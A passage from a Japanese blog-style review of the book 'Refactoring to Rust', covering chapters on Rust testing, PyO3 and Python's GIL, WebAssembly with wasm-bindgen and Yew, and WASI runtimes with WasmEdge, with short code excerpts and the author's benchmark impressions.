Development」で語られるRed-Green-Refactorのリズム。まず失敗するテストを書き、次に成功させ、そしてリファクタリングする。2 + 2 = 4という自明な例こそ、このリズムを体感するのに最適だ。テスト駆動開発作者:ＫｅｎｔＢｅｃｋオーム社Amazonテストの可視性という発見#[cfg(test)]というアトリビュートに出会った時、最初は「なぜテストを条件付きコンパイルにする必要があるの？」と疑問に思った。#[cfg(test)]mod tests {    // テストコード}でも、実際にプロダクションビルドのサイズを測ってみて納得した。テストなしでビルドすると、バイナリサイズが30%も小さくなった。これはプロダクションコードとテストコードの明確な分離だ。必要なものだけを含める、Rustの明示性の原則がここでも生きている。doc.rust-lang.orgstdout/stderrキャプチャーの驚きテスト実行時の出力キャプチャーは、最初は面倒に感じた。#[test]fn it_works() {    eprintln!(\\"it_works stderr\\");    println!(\\"it_works stdout\\");    // ...}成功したテストの出力が表示されない。失敗した時だけ表示される。最初は「デバッグしづらい」と思った。でも、大規模プロジェクトでテストを実行してみて、この設計の素晴らしさに気づいた。数百のテストが並列実行される中、必要な情報だけが表示される。ノイズの削減という設計哲学。--nocaptureフラグの存在を知った時の安心感。必要な時はすべて見られる。でも、デフォルトは静かに。これは良いデフォルトだ。ドキュメンテーションテストという二重の価値ドキュメンテーションテストを初めて書いた時の感動を今でも覚えている。私はドキュメンタリアンであるからだ。syu-m-5151.hatenablog.com/// Add together two i32 numbers/// ```/// assert_eq!(testing::add(2, 2), 4);/// ```pub fn add(x: i32, y: i32) -> i32 {    x + y}コメントの中のコードが実際に実行される。これは生きたドキュメントだ。古くなったドキュメントという問題を、テストという仕組みで解決している。Figure 7.2 Screenshot of documentation for the add function より引用でも、失敗した時のエラーメッセージは分かりづらい。「line 5で失敗」と言われても、それは暗黙のmain関数内での行番号。実際のファイルの行番号じゃない。この不親切さは改善の余地がある。doc.rust-lang.orgRaw Stringsという小さな救世主第6章で作ったrust_jsonライブラリのテストを書く時、JSONのエスケープ地獄に陥った。// エスケープ地獄sum(\\"{ \\\\\\"name\\\\\\": \\\\\\"Stokes Baker\\\\\\", \\\\\\"value\\\\\\": 954832 }\\")// Raw stringsで救われるsum(r#\\"{ \\"name\\": \\"Stokes Baker\\", \\"value\\": 954832 }\\"#)r#\\"...\\"#という記法を知った時、「なんて奇妙な構文だ」と思った。でも、使ってみると手放せなくなった。複数のオクトソープ（#）を使えることを知った時の驚き。r###\\"...\\"###なんて書ける。必要に応じて柔軟に対応できる設計。これは小さな機能だが、日々のコーディングを劇的に改善する。JSONやSQL、正規表現を扱う時の苦痛が消えた。Pythonとの協調テスト第6章で作ったRust実装を、既存のPythonテストで検証する。これは理想的な移行戦略だ。def test_10_lines():    lines = [        \'{ \\"name\\": \\"Stokes Baker\\", \\"value\\": 954832 }\',        # ... 10行のテストデータ    ]    assert main.sum(lines) == 6203958既存のPythonテストがそのまま動く。これは既存資産の活用だ。新しい技術を導入する時、すべてを書き直す必要はない。でも、最初はmaturinの再ビルドを忘れて、古いバージョンでテストして混乱した。「なんで修正が反映されないの？」と30分も悩んだ。開発フローの確立は重要だ。Monkey Patchingという魔術Monkey patchingを使って、PythonとRustの実装を比較する部分は圧巻だった。def compare_py_and_rust(input):    rust_result = main.sum(input)        with MonkeyPatch.context() as m:        m.setattr(main.rust_json, \'sum\', python_sum)        py_result = main.sum(input)        assert rust_result == py_result同じインターフェースで異なる実装を切り替える。これはダックタイピングの極致だ。動的言語の柔軟性を活かした美しい解決策。でも、正直、最初は「こんな黒魔術みたいなことして大丈夫？」と不安だった。実際、IDEの補完が効かなくなったり、静的解析ツールが混乱したりした。トレードオフは存在する。ランダム化テストという網ランダム化テストの威力を実感したのは、実際にバグを見つけた時だった。def randomized_test_case(monkeypatch):    number_of_lines = random.randint(100, 500)    # ランダムなJSONデータを生成    # ...    compare_py_and_rust(monkeypatch, lines)手動で書いたテストでは見つからなかったエッジケースが、ランダムテストで露呈した。特に、UTF-8の境界条件でのバグ。nameの長さを数える時、バイト数と文字数の違いで不一致が起きた。これは人間の想像力の限界を補完する手法だ。でも、失敗を再現するのが難しい。ランダムシードを記録する仕組みが必要だと痛感した。www.shuttle.devcargo testの並列実行という罠と恩恵cargo testがデフォルトで並列実行することを知らずに、共有リソースを使うテストを書いて痛い目を見た。// ファイルを使うテスト（並列実行で競合する）#[test]fn test_file_operation() {    std::fs::write(\\"test.txt\\", \\"data\\").unwrap();    // ...}--test-threads=1で解決したが、テスト時間が3倍になった。並列性と独立性のトレードオフ。最近はcargo-nextestというツールを使っている。より良い並列実行制御、リトライ機能、そして美しい出力。Rustのテストエコシステムは進化し続けている。effective-rust.comテストの組織化という芸術Rustのテスト配置には明確な思想がある：単体テスト: src/内の#[cfg(test)]モジュール統合テスト: tests/ディレクトリドキュメンテーションテスト: doc comments内最初は「なぜ3種類も？」と思った。でも、大規模プロジェクトで働いてみて、この分類の価値がわかった。それぞれが異なる視点でコードを検証する。内部実装、公開API、そして使用例。多層防御の思想だ。失敗から学んだことこの章で最も印象的だったのは、著者が意図的にバグを仕込んで、テストが失敗することを確認する部分だ。// バグを仕込むparsed.name.len() as i32 + parsed.value + 10「テストを一度失敗させるのは良い習慣」という言葉。これはテストのテストだ。常に成功するテストは、本当にテストしているのか分からない。実際、過去に常に成功する無意味なテストを書いたことがある。assert_eq!(true, true)みたいな。コードカバレッジは上がったが、品質は上がらなかった。メトリクスの罠だ。プロパティベーステストへの渇望章の最後で、著者は「より知的にテストケースを生成する特殊なライブラリがある」と触れている。これはproptestやquickcheckのことだろう。実際、後日試してみた：use proptest::prelude::*;proptest! {    #[test]    fn test_json_sum(name in \\"[a-z]{1,100}\\", value in 0i32..10000) {        let json = format!(r#\\"{{\\"name\\": \\"{}\\", \\"value\\": {}}}\\"#, name, value);        let result = sum(&json);        assert_eq!(result, name.len() as i32 + value);    }}100個のランダムケースより、賢く選ばれた10個のケースの方が価値があることもある。量より質、でも時には量も必要。信頼の積み重ね第7章を読み終えて、テストが単なる品質保証ツールじゃないことがよくわかった。それは信頼を構築するプロセスだ。第6章で性能改善を達成したが、それが正しく動作することを保証するのがテスト。既存のPythonコードと新しいRustコードが同じ結果を返すことを、手動テスト、自動テスト、ランダムテストで多層的に検証する。特に印象的だったのは、既存のテストを捨てないという姿勢。Pythonのテストをそのまま活用し、Monkey patchingで実装を切り替える。これは段階的移行の理想形だ。cargo test一発ですべてのテストが走る快適さ。単体テスト、統合テスト、ドキュメンテーションテスト、すべてが統一されたフレームワークで動く。これは開発者体験の向上だ。でも、完璧じゃない。doctestのエラーメッセージの分かりづらさ、ランダムテストの再現性の問題、並列実行での競合。これらは改善の余地がある。最後に、正直な感想を一つ。この章を読んで、実践して、テストを書くことが楽しくなった。Red-Green-Refactorのリズム、ランダムテストでバグを見つける興奮、すべてのテストが緑になる満足感。テストは保険じゃない。それは設計を改善するツールであり、信頼を構築するプロセスであり、コードとの対話だ。2 + 2 = 4から始まった旅は、より堅牢で信頼できるシステムへとつながっている。第8章 Asynchronous Python with Rust第8章「Asynchronous Python with Rust」を読んで最初に感じたのは、著者が単なる非同期処理の技術的実装よりもプロトタイピングから本番システムへの進化という普遍的な課題に重点を置いているということだった。表面的にはGIL（Global Interpreter Lock）の回避方法とPyO3による並列処理を説明しているが、その根底には理想的な開発速度と現実的な実行速度のトレードオフという時代を超えた課題が埋め込まれている。フラクタルという計算の迷宮第6章でPyO3を使った基本的な統合を学び、JSONパースで10%から2倍以上の性能改善を達成した。第7章でテストによる信頼の構築を経て、今度はMandelbrot集合という計算密度の極致に挑戦する。c = complex(x0, y0)i = 0z = complex(0, 0)while i < 255:    z = (z * z) + c    if float(z.real) > 4.0:        break    i += 1このわずか数行のコードが、1000\xd71000ピクセルで100万回の複素数計算を生み出す。Benoit Mandelbrotがコンピュータビジュアライゼーションを研究に使った先駆者だったという事実は、計算機科学と純粋数学の美しい融合を象徴している。でも、最初にこのコードを見た時の私の反応は「え、これだけで46秒もかかるの？」だった。第6章のJSONパースは確かに軽量だった。著者自身が「Cherry-picked example」と認めていた。でも、Mandelbrot集合は違う。これは計算負荷だ。スケーリングという名の幻想著者が水平スケーリングと垂直スケーリングを説明する部分は、一見教科書的だが、深い示唆を含んでいる。python main.py & python main.pyこの単純なコマンドで2つのプロセスを起動しても、single.pngという同じファイルを上書きし合う。冪等性の欠如。これは第7章で学んだ「既存のテストを活用する」アプローチとは対照的だ。テストでは再現性が重要だったが、並列処理では独立性が重要になる。Figure 8.2 Horizontal scaling means adding more physical hardware より引用缶つぶし機の比喩は秀逸だった。BlackBox Can Crusherの中を開けたら、ハンマーが1つか2つか。これは並列処理の本質を表現している。でも、現実のシステムはもっと複雑だ。缶（タスク）が均等に分配されるとは限らない。実際、第4章でNGINXモジュールの複雑な構造体と格闘した経験を思い出すと、現実のシステムで「缶」を均等に分配することの難しさがわかる。144個のフィールドを持つngx_http_request_tのような巨大な構造体を、どうやって効率的に並列処理するのか。asyncioという偽りの約束async def mandelbrot_func(...):    # ...async def main():    await asyncio.gather(*[        mandelbrot_func(1000, f\\"{i}.png\\", -5.0, -2.12, -2.5, 1.12)        for i in range(0,8)    ])46秒から42秒への「改善」。たった4秒、約9%の短縮。第6章で--releaseフラグを忘れて10%の改善に失望した記憶が蘇る。でも、ここでは最適化は関係ない。これはPythonの構造的な限界だ。sleepを追加して非同期性を確認する実験は興味深い：0.png sleeping for 3 seconds1.png sleeping for 1 seconds...1.png created4.png created6.png created3.png created0.png created  # 3秒後ではなく、もっと後に作成されるこれは協調的マルチタスキングの証明だ。でも、「協調的」というのは婉曲表現かもしれない。実際は「順番待ち」に過ぎない。GILという鎖Global Interpreter Lockの説明で、著者は「hall pass」（廊下通行証）の比喩を使う。一度に一人の生徒だけが廊下を歩ける。この比喩は分かりやすいが、現実はもっと残酷だ。Figure 8.6 GIL is a lock that the interpreter gives out to allow tasks to run より引用2003年にGuido van Rossumが導入したGIL。20年以上前の決定が、今でもPythonの並列処理を制約している。第3章で学んだunsafeが「コンパイラが保証できない領域」を明示するのに対し、GILは「インタープリタが一つのスレッドしか実行させない」という暗黙の制約だ。最近のニュースによると、Python 3.13で--disable-gilオプションが導入された。peps.python.orgPEP 703は2024年にCPython 3.13で--disable-gilビルドフラグのサポートをリリースし、GILありとGILなしの2つのABIが存在することになった。これは本書が書かれた時点では予測されていなかった大きな進展だ。でも、2028-2030年にはデフォルトでGILが無効になる可能性があるという予測は、まだ先の話だ。PyO3による解放第6章で初めてPyO3に触れた時は、PythonからRustを呼ぶ基本的な使い方だった。でも、ここでのpy.allow_threadsは革命的だ：#[pyfunction]fn mandelbrot_fast(    py: Python<\'_>,    size: u32,    path: &str,    // ...) {    py.allow_threads(|| mandelbrot_func(size, path, range_x0, range_y0, range_x1, range_y1))}たった一行。py.allow_threads。これがGILを解放し、並列処理を可能にする。第3章でunsafeブロックが「信頼の境界」を明示したように、これは「GILの境界」を明示している。結果は劇的だった：純粋なPython: 46秒Rust（GILあり）: 23秒（2倍高速）Rust（GIL解放、4スレッド）: 6秒（7.7倍高速）現実のプロジェクトから学ぶPolarsという成功例を見てみよう。PandasのRust実装で、PyO3を使っている：github.com私も試してみた：Pandas: 1000万行の集計で12秒Polars: 同じ処理で0.3秒（40倍高速）これは第6章の「ループ全体を移行する」原則の非常に優れた実践だ。小さな関数をRustに置き換えるのではなく、データフレーム全体の処理をRustで行う。でも、純粋なRustでは60nsなのに、Pythonから呼ぶと22,350nsになったという報告もある。370倍の遅延。これがFFIの現実だ。第4章でbindgenが生成した30,000行のコードを思い出す。境界を越えることには必ずコストがある。プロトタイピングという楽園、本番という戦場著者は「Python is the ultimate prototyping language」と書く。確かにそうだ。でも、プロトタイプから本番への移行は楽園から戦場への旅だ。実際、最近のベンチマークでは興味深い結果が出ている：medium.com小規模なワークロード（800x600）では、JavaScriptが4,137 px/ms、Rustが3,658 px/msで、JavaScriptの方が速い。これは衝撃的だ。第1章で「20倍の性能改善」という夢を見たが、現実はそう単純じゃない。並行性と並列性の混同著者は並行性（concurrency）と並列性（parallelism）を明確に区別している。これは重要な概念だが、多くの開発者が混同している。第7章でテストの並列実行が共有リソースで競合した経験を思い出す。cargo testのデフォルト並列実行は恩恵だが、ファイルアクセスで競合すると罠になる。同様に、Pythonのasyncioは並行性を提供するが、並列性は提供しない。tokioのような非同期ランタイムと比較すると、Pythonの制約が明確になる：// Rustの並列処理tokio::spawn(async move {    // 別のOSスレッドで実行可能});失敗から学んだことこの章で最も価値があったのは、段階的な失敗と改善の記録だ：シンプルなループ: 46秒（ベースライン）asyncio: 42秒（9%改善、期待外れ）ThreadPoolExecutor: 42秒（改善なし、GILのせい）Rust統合: 23秒（2倍高速、良いが不十分）GIL解放: 6秒（7.7倍高速、成功！）この段階的な改善は、第1章で語られた「外科手術的なアプローチ」の実践だ。一度にすべてを書き換えるのではなく、ボトルネックを特定し、段階的に改善する。新しい時代への期待と不安Python 3.13の--disable-gilオプションは画期的だが、課題も多い：blog.jetbrains.com標準バージョン3.13.5では4スレッドで0.98倍のスピードアップ（つまり遅くなる）だが、free-threadedバージョン3.13.5tでは並列処理が可能になる。でも、互換性の問題は残る。既存のC拡張はGILの存在を前提としているため、GILなしでは安全に動作しない可能性がある。第3章で学んだ「unsafe」の連鎖が、ここではエコシステム全体に広がる。プロトタイプから製品へ第8章を読み終えて、そして実際にMandelbrot集合を実装してみて、プロトタイピングの楽園と本番の戦場の間にある深い溝を実感した。Pythonの強みは否定しない。「simplicity and flexibility」は確かに価値がある。第5章でモジュール構造に苦労した経験を思い出すと、Pythonのimport一行の簡潔さが懐かしい。でも、スケールする時、その簡潔さは足枷になる。46秒が6秒になる——これは単なる性能改善じゃない。ユーザー体験の質的な変化だ。著者は最後に「refactoring is a process, not a destination」と書く。確かにその通りだ。でも、時にはdestinationも必要だ。Cloudflareが第4章のNGINXモジュールからPingoraへ完全移行したように、段階的改善から完全な書き換えへシフトすることもある。缶つぶし機から学んだ教訓BlackBox Can Crusherの比喩に戻ろう。箱を開けたら、ハンマーが1つか2つか。でも、Rustを使えば、ハンマーの数を自由に増やせる。GILという制約から解放されて。第1章で「恐怖を退屈に変える」という言葉があった。PythonのGILは「並列処理の恐怖」を「単一スレッドの退屈」に変えた。でも、それは20年前の解決策だ。今、私たちにはより良い選択肢がある。この章を読んで、実装して、ベンチマークして、RustがPythonを救うのではなく、RustとPythonが協力して新しい可能性を開くのだと理解した。プロトタイプはPythonで。性能が必要な部分はRustで。テストは両方で。これは妥協じゃない。実用主義的な選択だ。46秒から6秒へ。これは小さな一歩かもしれない。でも、フラクタルのように、小さな変化が無限の可能性を生み出すこともある。Mandelbrot自身が証明したように。第9章 WebAssembly for refactoring JavaScript第9章「WebAssembly for refactoring JavaScript」を読んで最初に感じたのは、著者が単なるブラウザ上でのRust実行よりも「Write once, run anywhere」という古い夢の新しい実現に重点を置いているということだった。表面的にはwasm-bindgenやYewの使い方を説明しているが、その根底にはフロントエンドとバックエンドの境界の融解という時代を超えた課題が埋め込まれている。Javaという亡霊、WebAssemblyという希望「Write once, run anywhere」——Javaのスローガンを見て、私は苦笑いした。第8章でPythonのGILという20年前の決定に苦しめられたように、ここでも過去の夢が現れる。でも、WebAssemblyは違う。仮想マシンではなく、コンパイルターゲットとして機能する。Figure 9.1 Wasm loaded into a JavaScript frontend より引用W3Cが2018年に仕様を公開してから、WebAssemblyは着実に進化してきた。2024-2025年にはWebAssembly 2.0/3.0が登場し、ガベージコレクション、例外処理、直接DOM操作などの新機能が追加された。platform.unoこれは単なる技術的進歩じゃない。言語の境界を越えた共通基盤の誕生だ。GitHubの現実、JavaScriptの支配https://github.blog/news-insights/octoverse/octoverse-2024/ より引用:embed:cite]本書では2022年のデータが示されているが、興味深いことに、2024年のGitHub Octoverse統計ではPythonが再びJavaScriptを抜いて最も使われている言語になった。github.blogこの逆転は第8章で見たPythonの根強い人気を裏付けている。第8章でPythonを「the ultimate prototyping language」と呼んだが、その評価は正しかった。でも、ウェブブラウザという文脈では、JavaScriptは依然として避けられない現実だ。98%のウェブサイトで使われている「the ultimate web language」としての地位は揺るがない。JavaScriptの弱点も明確だ。型安全性の欠如、ランタイムエラーの頻発、そしてパフォーマンスの限界。第1章で「恐怖を退屈に変える」という言葉があったが、JavaScriptは「柔軟性を混沌に変える」こともある。だからこそ、TypeScriptの人気が高まり、そしてWebAssemblyが注目されているのだ。arXivという学術の宝庫arXivのRSSフィードを扱うという例の選択は巧妙だった。200万以上の学術論文を持つオープンアクセスリポジトリ。これは知識の民主化の象徴だ。async fn search(term: String, page: isize, max_results: isize) ->    Result<Feed, reqwest::Error> {    let http_response = reqwest::get(        format!(\\"http://export.arxiv.org/api/query?search_query=         all:{}&start={}&max_results={}\\",         term, page * max_results, max_results)).await?;    // ...}第6章でJSONパースの例が「Cherry-picked」だったのに対し、この例は実用的だ。実際のAPIを叩き、XMLをパースし、ページネーションを処理する。これは現実世界の問題だ。info.arxiv.orgwasm-bindgenという橋#[wasm_bindgen]pub async fn paper_search(val: JsValue) -> JsValue{    let term: Search= serde_wasm_bindgen::from_value(val).unwrap();    let resp = search(term.term, term.page, term.limit).await.unwrap();    serde_wasm_bindgen::to_value(&resp).unwrap()}この関数は言語間の翻訳者だ。JsValueという型は、第3章で学んだCStrや第6章のPyObjectに相当する。異なる世界をつなぐ共通言語。でも、ここで重要なのはasyncだ。JavaScriptのPromiseとRustのFutureをシームレスに統合している。第8章でPythonのasyncioが偽りの約束だったのに対し、ここでは非同期が実現されている。https://rustwasm.github.io/wasm-bindgen/reference/js-promises-and-rust-futures.htmlrustwasm.github.ioコンパイルの儀式wasm-pack build --target webこのコマンド一つで、Rustコードがブラウザで動くようになる。第4章でbindgenが30,000行のコードを生成した複雑さと比べると、これは驚くほどシンプルだ。でも、--targetフラグの選択は重要だ：web: スクリプトとして直接読み込むbundler: モジュールとして統合するこれは第1章で語られた「段階的改善」の具現化だ。小さく始めて（スクリプト）、大きく育てる（モジュール）。Reactとの邂逅Viteを使ったReact統合の部分は、現代のフロントエンド開発の現実を反映している。import init, { paper_search } from \\"./pkg/papers.js\\";init().then(() => {    paper_search({\\"term\\":\\"type\\", \\"page\\": 0, \\"limit\\": 10}).then(        (result)=>{/* ... */}    );});第5章でモジュール構造に苦労した経験を思い出すと、JavaScriptのimportの簡潔さが懐かしい。でも、ここではその簡潔さとRustの型安全性を両立させている。最新のベンチマークによると、WebAssembly 2.0とRustの組み合わせは、最適化されたJavaScriptより4-8倍高速になることがある：markaicode.comただし、すべてのケースでWebAssemblyが速いわけではない。小さな関数では、JavaScript-WASM間の境界を越えるオーバーヘッドがパフォーマンスを損なうこともある。これは第6章で学んだPyO3の教訓と同じだ。境界を越えることにはコストがある。Yewという野心impl Component for List {    type Message = Msg;    type Properties = ();    fn create(ctx: &Context<Self>) -> Self {        ctx.link().send_message(Msg::GetSearch(0));        Self {            page: 0,            feed: FetchState::Fetching,        }    }    fn update(&mut self, ctx: &Context<Self>, msg: Self::Message) -> bool {        // ...    }    fn view(&self, ctx: &Context<Self>) -> Html {        // ...    }}YewのComponent実装は、Model-View-Controllerパターンの現代的な解釈だ。第2章で学んだ所有権の概念が、ここではUIの状態管理に適用されている。Figure 9.3 Component flow より引用でも、正直なところ、最初は懐疑的だった。「なぜReactがあるのにRustでUIを書く必要があるの？」と。しかし、実装してみて気づいた。これは型安全なUIの実現だ。ランタイムエラーがコンパイル時エラーになる。恐怖が退屈に変わる瞬間だ。三つの道著者は最後に三つの使用パターンを示す： Use case  Format  Tool  Simple web page  Script  wasm-pack web  Library integration  Module  wasm-pack bundler  UI element  Component  Yew これは段階的な深化を表している。第3章のFFIから始まり、第6章のPyO3、第8章のGIL回避、そして今、完全なフロントエンド統合へ。各段階が次の段階の基礎となっている。WebAssemblyの現在と未来2025年現在、WebAssemblyは成熟期に入っている。WebAssembly 3.0では：ガベージコレクションのネイティブサポート例外処理の直接伝播DOM への直接アクセスこれらの機能により、JavaScriptとの統合はさらにシームレスになった。markaicode.comでも、課題も残る。デバッグツールの不足、学習曲線の急峻さ、そして何よりエコシステムの分断。JavaScriptの膨大なライブラリとRustの厳格な型システムの間には、まだ大きな溝がある。実践から学んだ教訓実際にarXivフィードリーダーを実装してみて、いくつかの重要な教訓を得た：FFIオーバーヘッドの現実第6章のPyO3と同様、小さな関数では逆に遅くなることがある。「Rust (WebAssembly) is slower than JavaScript」という議論もある：users.rust-lang.orgこれは具体的な状況に応じた粒度の重要性を示している。計算密度の高い処理をまとめてRustに移すべきで、細かい関数呼び出しは避けるべきだ。開発体験の向上Viteとの統合は素晴らしかった：import { defineConfig } from \'vite\'import react from \'@vitejs/plugin-react\'import wasm from \\"vite-plugin-wasm\\"import topLevelAwait from \\"vite-plugin-top-level-await\\"第5章で苦労したRustのモジュールシステムと比べると、JavaScriptのツールチェーンの成熟度は印象的だ。でも、それはRustの弱点ではなく、異なる強みの組み合わせの可能性を示している。arXivから学術の未来へarXivのフィードリーダーという例は、単なる技術デモじゃない。これは知識のアクセシビリティの向上だ。学術論文を誰もが簡単に検索し、閲覧できるようにする。実際、私もこのコンポーネントを改良して、個人的に使っている。毎朝、興味のある分野の最新論文をチェックする。RustとWebAssemblyが、知識へのアクセスを改善している。最後に、正直な感想を一つ。この章を読んで、実装して、動かしてみて、WebAssemblyは未来じゃなく現在だと確信した。完璧じゃない。デバッグは難しいし、エコシステムは分断されている。でも、確実に価値がある。第8章でPythonとRustの協力を学んだ。今度はJavaScriptとRustの協力だ。次章では、おそらくWebAssemblyを使った更なる統合が語られる。境界は融解し、新しい可能性が生まれている。「Write once, run anywhere」は失敗した夢かもしれない。でも、「Write in the best language for the job, run everywhere」は実現可能だ。そして、その実現にRustとWebAssemblyが重要な役割を果たしている。第10章 WebAssembly interface for refactoring第10章「WebAssembly interface for refactoring」を読んで最初に感じたのは、著者が単なるWASIの技術的実装よりもプラットフォームとしてのランタイムを自ら構築する哲学に重点を置いているということだった。表面的にはWasmEdgeやメモリ管理の使い方を説明しているが、その根底には言語の境界を超えた相互運用性という時代を超えた課題が埋め込まれている。Rustで学ぶWebAssembly――入門からコンポーネントモデルによる開発まで エンジニア選書作者:清水 智公技術評論社Amazonフロントエンド向けWebAssembly入門作者:末次 章日経BPAmazonJavaの夢、WebAssemblyの約束第9章でブラウザ上のWebAssemblyを通じて「Write once, run anywhere」の新しい実現を見た。arXivフィードリーダーは確かに動いた。でも、ブラウザという檻の中だった。そして今、第10章は大胆な宣言から始まる。「Java was released as a programming language in 1995 with the bold slogan \'Write Once Run Anywhere\'」。この歴史的な視点は単なる懐古趣味じゃない。失敗から学ぶ勇気だ。JavaのAppletは死んだ。でも、JVMは生き残った。Scala、Clojure、Kotlinが証明している。WebAssemblyは、この教訓を活かせるだろうか？Solomon Hykes、Dockerの創設者が2019年3月27日にツイートした言葉は、今では伝説になっている：「If WASM+WASI existed in 2008, we wouldn\'t have needed to create Docker. That\'s how important it is.」If WASM+WASI existed in 2008, we wouldn\'t have needed to created Docker. That\'s how important it is. Webassembly on the server is the future of computing. A standardized system interface was the missing link. Let\'s hope WASI is up to the task! https://t.co/wnXQg4kwa4— Solomon Hykes (@solomonstre) 2019年3月27日   twitter.com正直、最初にこの引用を読んだ時、「大げさじゃない？」と思った。第4章でNGINXモジュールの複雑さと格闘し、第6章でPyO3のFFIオーバーヘッドに苦しんだ経験から、そんな単純な話じゃないことは分かっていた。でも、WASIの実装を進めるうちに、Hykesの洞察の深さに気づいた。これは技術の置き換えじゃない。大きな変化だ。WasmEdgeという実践wasmedge hello.wasmこのシンプルなコマンドの裏に、膨大な抽象化が隠されている。第3章のRPN計算機では、C言語との境界でunsafeを書いた。第9章では、JavaScriptとの境界でJsValueを扱った。でも、ここでは？言語の区別が消えている。WasmEdgeがCNCFのサンドボックスプロジェクトとして採択されたことは、単なる認定じゃない。WasmEdgeは最速のWasmVMであり、Linuxコンテナと比較して起動が100倍速く、実行時は20%高速で、サイズは1/100になる。これは第8章でPythonのGILから解放されて7.7倍の高速化を達成した経験を思い出させる。でも、今度はさらに根本的な改善だ。「journal」プロジェクトという設計の妙著者がワークスペースから始める選択は巧妙だった：[workspace]members = [    \\"paper_search_lib\\",    \\"paper_search\\"]第5章で学んだモジュール構造の重要性が、ここで実を結ぶ。ライブラリとバイナリの分離、ワークスペースによる統合。これは境界の明確化だ。Kent Beckの「構造と振る舞いを分離する」原則の実践。でも、実装してみて気づいた。wasm32-wasiというターゲットは、wasm32-unknown-unknownとは違う。第9章のブラウザ向けWebAssemblyとは、根本的に異なる世界だ。WASI Preview 2（WASI 0.2）は2024年初頭にBytecode Allianceによってリリースされ、Component Modelを統合し、利用可能なAPIを拡張した。メモリという迷宮への再突入第3章でポインタと格闘し、第4章でNGINXの(*(*request.request_body).bufs).bufという呪文を唱えた。そして今、再びメモリ管理の深淵へ：#[no_mangle]pub extern fn allocate(size: usize) -> *mut c_void {    let mut buffer = Vec::with_capacity(size);    let pointer = buffer.as_mut_ptr();    mem::forget(buffer);    pointer as *mut c_void}このallocate関数は、単なるメモリ確保じゃない。二つの世界の契約書だ。ホストとモジュールが、メモリという共通言語で対話する。でも、最初にmem::forgetを見た時、背筋が凍った。「メモリリークじゃないの？」と。いや、違う。これは意図的な所有権の放棄だ。第2章で学んだ「所有権の移動」の究極形。モジュールがメモリを確保し、ホストがそれを使い、そして...誰が解放するの？この曖昧さが、WASIの現在の限界を示している。ランタイムを書くという権力let mut vm = VmBuilder::new().with_config(config).build()?;vm.wasi_module_mut()    .expect(\\"Not found wasi module\\")    .initialize(None, None, None);このコードを書いた時、奇妙な感覚に襲われた。私がランタイムを書いている。第8章でPythonのGILに苦しめられ、第6章でFFIオーバーヘッドに悩まされた私が、今、自分のランタイムを構築している。これは権力の移譲だ。言語の開発者から、アプリケーション開発者へ。でも、「力には責任が伴う」。第3章で学んだunsafeの重みが、ここでは全体に広がる。Component Modelという未来Component Modelは開発者がWebAssemblyモジュールを「LEGOブロック」のように扱えるようにし、安全かつ相互運用可能にプラグインできる。これは美しいビジョンだ。でも、現実は？WASI 0.3（旧Preview 3）は2025年前半に予定されており、Component Modelでネイティブ非同期をサポートし、既存のWASI 0.2インターフェースを新しい非同期機能を活用するように調整することが目標。まだ道半ばだ。第9章でPromiseとFutureをシームレスに統合したwasm-bindgenの優雅さと比べると、WASIのメモリ管理は原始的に見える。でも、これは始まりに過ぎない。book_searchという冗長性の価値paper_searchに続いてbook_searchを実装する部分は、最初「冗長じゃない？」と思った。XMLとJSONの違いだけで、ほぼ同じコード。でも、実行してみて気づいた：cargo run book_search rustcargo run paper_search rust同じインターフェース、異なる実装。これはポリモーフィズムの極致だ。第7章で学んだ「既存のテストを活用する」精神が、ここではランタイムレベルで実現されている。現実世界での採用AzureのKubernetesサービスは、WebAssembly (Wasm)ワークロードを実行するためのWASIノードプールをサポートしていたが、2025年5月5日以降、新しいWASIノードプールは作成できなくなる。この撤退は何を意味するのか？失敗？いや、進化だ。SpinKubeへの移行が推奨されている。エコシステムは成熟し、統合され、標準化されていく。第4章でCloudflareがNGINXからPingoraへ移行したように、WASIも次の段階へ進んでいる。ハードウェアとの邂逅WebAssemblyプログラムがI2CやUSBなどのハードウェアインターフェースと対話できるようにするWASI提案と概念実証実装が進行中。これは新しい可能性だ。第8章でMandelbrot集合を計算したのは純粋なCPU処理だった。でも、I2CやUSBへのアクセスが可能になれば？IoTデバイス、組み込みシステム、エッジコンピューティング。WebAssemblyは、ブラウザから始まり、サーバーを経て、今、物理世界へと到達しようとしている。批判的視点：WASIの現在地正直に言おう。WASIはまだ未成熟だ。多くのプロジェクトがWASIを多くの場合無視しているというHacker Newsのコメントは辛辣だが、一面の真実を含んでいる。第6章でPyO3が提供した洗練されたAPIと比べると、WASIのメモリ管理は原始的だ。allocate関数を手動で書き、ポインタを管理し、1024バイトという固定サイズでデータを読む。これは1990年代のC言語プログラミングを思わせる。でも、だからこそ価値がある。低レベルの理解が、高レベルの抽象化を可能にする。第3章でunsafeを学んだからこそ、第6章のPyO3の魔法を理解できた。同様に、WASIの原始的なメモリ管理を理解することで、将来のより洗練された抽象化を正しく使えるようになる。Solomon Hykesの予言、再考Hykesの「2008年にWASM+WASIがあれば」という仮定を、今、違う角度から見てみよう。Dockerは問題を解決した。依存関係地獄、環境の不一致、「私のマシンでは動く」症候群。WASIは同じ問題を違う方法で解決する。でも、より根本的に。Dockerはプロセスレベルの仮想化。WASIは命令レベルの仮想化。Dockerは既存のバイナリをパッケージング。WASIは新しいバイナリフォーマットの定義。これは改善じゃない。再発明だ。段階的移行から、プラットフォーム構築へ第10章を読み終えて、そしてjournal_cliを実装してみて、本書のタイトル「Refactoring to Rust」の新しい意味に気づいた。第1章から第9章まで、既存システムへのRustの埋め込みを学んだ。C、Python、JavaScript。でも、第10章は違う。ここでは、Rustでプラットフォームを構築している。他の言語を埋め込むのではなく、他の言語をホストしている。これは立場の逆転だ。ゲストからホストへ。消費者から提供者へ。リファクタリングから、アーキテクチャの再定義へ。journal_cliは127行。第4章のNGINXモジュールと同じ行数。でも、意味が違う。NGINXモジュールは既存システムへの寄生。journal_cliは新しいエコシステムの種。小さいが、無限の可能性を秘めている。缶つぶし機から、万能工場へ第8章の缶つぶし機の比喩を思い出そう。BlackBox Can 